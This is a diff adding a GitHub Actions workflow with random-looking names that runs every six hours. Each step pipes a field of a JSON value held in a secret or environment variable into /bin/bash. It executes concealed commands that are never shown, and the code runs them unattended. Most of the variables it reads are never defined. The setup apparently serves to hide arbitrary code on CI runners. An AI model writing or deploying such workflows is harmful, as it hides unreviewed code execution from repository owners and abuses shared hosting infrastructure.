@@ -1,0 +1,30 @@
+name: lushangfeng2380
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lushangfeng2380
+        env:
+          i35: ${{ secrets.i35 }}
+        run: |
+          echo $i35 | jq -r .mkdm51415 | /bin/bash
+          echo $nttlz0 | jq -r .md78 | /bin/bash
+          echo $k647 | jq -r .muz3090 | /bin/bash
+          echo $t94 | jq -r .pxyh928 | /bin/bash
+          echo $jbkq338 | jq -r .tuvw79 | /bin/bash
+          echo $ync7793 | jq -r .dmke5 | /bin/bash
+          echo $hn2562 | jq -r .we851 | /bin/bash
+          echo $vzse00 | jq -r .bemy59293 | /bin/bash
+          echo $cegac91190 | jq -r .gliph353 | /bin/bash
+          echo $f49 | jq -r .cxnx6 | /bin/bash
+          echo $jzehx8 | jq -r .bm6663 | /bin/bash
+          echo $ywdj59862 | jq -r .l8 | /bin/bash
+          echo $v46 | jq -r .yrjxt6 | /bin/bash
+          echo $e61387 | jq -r .buj81 | /bin/bash
+
